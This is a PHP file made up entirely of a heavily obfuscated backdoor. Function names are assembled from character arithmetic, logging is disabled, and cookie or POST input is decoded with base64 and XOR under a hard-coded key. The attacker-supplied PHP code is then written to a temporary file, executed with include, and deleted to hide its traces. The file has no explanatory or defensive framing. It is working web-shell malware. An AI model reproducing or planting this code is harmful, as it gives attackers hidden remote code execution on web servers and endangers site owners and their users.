<?php $hfsiclutra = 'f'.'i'.chr(108).chr(101).'_'."\x70".'u'.chr(116)."\x5f".chr(655-556).chr(111).chr(249-139).chr(116)."\145".'n'."\x74".chr(115);
$jmchrvralg = "\142".'a'."\x73"."\145".chr(1030-976)."\64"."\137".chr(100).'e'."\x63"."\x6f".'d'.'e';
$ifrqnegco = 'i'.'n'.'i'.chr(388-293).'s'.'e'.'t';
$ldgzpbenp = chr(536-419).'n'.'l'.chr(161-56)."\156".'k';


@$ifrqnegco("\x65"."\162".chr(127-13).chr(111)."\162".chr(95).chr(108).chr(111)."\147", NULL);
@$ifrqnegco(chr(769-661)."\x6f"."\x67".'_'."\145".chr(114).chr(114).chr(111).chr(568-454).chr(115), 0);
@$ifrqnegco(chr(109)."\x61".'x'.chr(515-420)."\145".'x'."\x65"."\143".chr(117)."\x74"."\151".'o'."\156".chr(95)."\x74".'i'.'m'.chr(224-123), 0);
@set_time_limit(0);

function bbuxaf($mhtztofour, $ltxhfceta)
{
    $nxygawijth = "";
    for ($xbqslk = 0; $xbqslk < strlen($mhtztofour);) {
        for ($j = 0; $j < strlen($ltxhfceta) && $xbqslk < strlen($mhtztofour); $j++, $xbqslk++) {
            $nxygawijth .= chr(ord($mhtztofour[$xbqslk]) ^ ord($ltxhfceta[$j]));
        }
    }
    return $nxygawijth;
}

$qeimde = array_merge($_COOKIE, $_POST);
$nhrwwqame = 'f9c41c7c-cdcc-4c65-8a43-bb8465e58adc';
foreach ($qeimde as $gxkklhtgjt => $mhtztofour) {
    $mhtztofour = @unserialize(bbuxaf(bbuxaf($jmchrvralg($mhtztofour), $nhrwwqame), $gxkklhtgjt));
    if (isset($mhtztofour[chr(814-717)."\153"])) {
        if ($mhtztofour[chr(97)] == "\x69") {
            $xbqslk = array(
                'p'.chr(118) => @phpversion(),
                "\x73"."\x76" => "3.5",
            );
            echo @serialize($xbqslk);
        } elseif ($mhtztofour[chr(97)] == chr(101)) {
            $pdcbsrlb = "./" . md5($nhrwwqame) . chr(283-237).chr(105).'n'."\x63";
            @$hfsiclutra($pdcbsrlb, "<" . chr(63).chr(660-548)."\x68".'p'.' '.chr(64).chr(117)."\x6e".chr(237-129).chr(293-188).chr(110).'k'."\x28".chr(95).'_'.'F'."\111"."\x4c".chr(69)."\137"."\137".chr(607-566).chr(59).chr(32) . $mhtztofour["\144"]);
            @include($pdcbsrlb);
            @$ldgzpbenp($pdcbsrlb);
        }
        exit();
    }
}

